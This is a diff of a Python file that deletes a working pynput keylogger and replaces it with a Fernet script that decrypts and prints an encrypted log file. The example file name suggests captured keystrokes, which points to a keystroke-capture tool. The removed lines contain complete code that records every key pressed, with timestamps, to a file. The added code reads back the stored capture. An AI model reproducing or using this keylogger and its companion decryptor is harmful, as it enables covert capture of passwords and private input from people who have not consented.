@@ -1,22 +1,18 @@
-import pynput
-from pynput.keyboard import Key, Listener
-import time
-from datetime import datetime
+from cryptography.fernet import Fernet
 
-# Create a new log file with timestamp for each run
-log_file = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
+def load_key():
+    with open("secret.key", "rb") as key_file:
+        return key_file.read()
 
-def on_press(key):
-    with open(log_file, "a") as f:
-        try:
-            f.write(f"{time.ctime()} - {key.char}\n")
-        except AttributeError:
-            f.write(f"{time.ctime()} - {key}\n")
+def decrypt_file(filename):
+    key = load_key()
+    fernet = Fernet(key)
+    with open(filename, "rb") as f:
+        encrypted_data = f.read()
+    decrypted_data = fernet.decrypt(encrypted_data)
+    print("\n=== Decrypted Log Output ===\n")
+    print(decrypted_data.decode())
 
-def on_release(key):
-    if key == Key.esc:
-        # Stop listener on pressing ESC
-        return False
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+if __name__ == "__main__":
+    path = input("Enter path to encrypted log file (e.g. logs/log_2025-08-04_15-32-12.txt): ")
+    decrypt_file(path)
